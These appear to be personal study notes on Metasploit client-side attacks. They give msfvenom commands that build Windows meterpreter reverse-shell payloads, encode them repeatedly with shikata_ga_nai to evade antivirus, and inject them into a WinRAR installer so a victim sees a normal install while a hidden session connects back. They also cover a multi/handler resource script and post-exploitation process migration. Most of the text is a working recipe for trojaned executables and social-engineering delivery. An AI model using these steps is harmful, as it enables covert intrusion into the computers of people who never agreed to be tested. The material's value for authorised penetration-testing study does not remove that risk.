  

### ==_**Client-Side Attacks**_==

  

### ==_Payload_==

- ==**_Generating Payloads With Msfvenom_**==

> is an attack vector that involves coercing a clinet to execute a malicious payload on their system that consequently connects back to the attacker when executed

> typically utilize various social engineering techniques

> `Msfvenom` is a command line utility that can be used to generate and encode MSF payloads

> `Msfvenom` is combination of 2 utilities , msfpayload && msfencode

> Used to generate a malicious meterpreter payload that can be transferred to a client target system

- ==**_Generating Payloads With Msfvenom_**==
    
    - ==_staged payload⇒ 32 bit | non-staged payload⇒64 bit_==
    - `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=1234 -f exe => <path where u want to save it >` ⇒ to generate a paylod and save it on exe file (it’s windows 32 bit )
    - `chmod +x <payload.exe>`
    - now uploading this file on target ip , can be done by social eng
    - to create a handler ⇒ `use multi/handler`
    - `set payload <your payload (windows/x64….)>` && `set Lhost and lport` && `run`
    - now we need to transfer the payload to the target and make him open it , then we will receive a connection on our handler .
    
      
    
      
    

  

  

- ==_**Encoding Payloads With Msfvenom**_==

> when we want to transfer our payload we need to be cognisant of AV(anti virus) detection .

> Most of end user AV solutions utilize signature based detection in order to identify malicious files .

> by using encoding on our payload we can avoid that detection

> so when the AV detect a malicious files it give it a signature and store this signature on signature database for all AV company's , so when we transfer our payload and the target execute it , the AV check the signature of the file if match any signature marked as a malicious , it will alert the target .

- ==_**Encoding Payloads With Msfvenom**_==
    
    - `msfvenom —list encoders` ⇒ to list all encoders options we can use
    - the best 2 encoder ⇒ `x86/shikata_ga_nai` && `cmd/powershell_base64`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=1234 -e x86/shikata_ga_nai -f exe ⇒ <path where u want to save it>/payload.exe` ⇒ that will generate a payload for 32 bit and encoding it using shikata_ga_nai .
    - ==**_the more u encoding the payload your chance will be increased to evading AV , the name of more encoding is iterations_**==
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe` ⇒ here we will change the iteration from 1 to 10
    
      
    

  

  

- **_==Injecting Payloads Into Windows Portable Executables==_**

> that used to avoid the detection from the AV

> the process here is we will generate a meterpreter payload and inject it on other file like WinRAR setup file

  

- **_==Injecting Payloads Into Windows Portable Executables==_**
    
    - `first we need to download the WINRAR setup file (32 bit or 64 bit)`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe` ==`-x <path of the WINRAR setup file>`== `⇒ <path where u want to save it>/winrar.exe` ⇒ so that will generate a meterpreter payload , and encode it 10 times , then it will ==_inject this payload on the WinRAR setup file , so when we transfer the payload we will not transfer the payload.exe no we will transfer the WinRAR setup file , so we will avoid the AV detection ._==
    
    > now after u get the meterpreter session , run the migrrate model that will , change the payload to another process and that will help u alot
    
    - `run post/windows/manage/migrate` ⇒ on meterpreter session , after exploitation
    - ==we can use -k with -x ⇒ that will let the WinRAR file as is , so if the user open it it will be a simple WinRar file , but in background the Payload is executetion==
    - `-e x86/shikata_ga_nai -i 10 -f exe` ==`-k`== ==`-x <path of the WINRAR setup file>`== `⇒ <path where u want to save it>/winrar.exe` ⇒ ==-k== ==_will let the WinRar file as is , so when the user click on it it will see the simple winrar file , but in background we will get a meterpreter session and the user will not know that ._==
    
    > _that’s -k may not work in alot of file , so u can search for files accept that_
    
      
    
      
    

  

  

  

### ==_Automating_==

- ==**_Automating Metasploit With Resource Scripts_**==

> Metasploit resource scripts great feature of MSF that allow you to automate repetitive tasks and command .

> so like use a multi/handler and run it every time , resource script will make hole process automatic

> it’s like the bash script

- ==**_Automating Metasploit With Resource Scripts_**==
    
    - u can check what u have a resource script prepackaging ⇒ `ls -al /usr/share/metaspolit…/scripts/resource`
    - `gedit handler.rc` ⇒ make a resource script to automate the set up multi/handler
    - ```
        use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcp<%lhost = datastore['LHOST']arch = datastore['Bit']if arch == "x64"set PAYLOAD windows/x64/meterpreter/reverse_tcpend%>set LHOST <%= lhost %>set LPORT 1234run
        ```
        
    - so this script will automate the multi/handler proceess
    - we can save it in msfconsloe using ⇒ `msfconsole -r handler.rc`
    - on msfconsole ⇒ `msfconsole -r handler.rc LHOST=<your ip> Bit=x64`
    
    > that will run the msfconsole and do every thing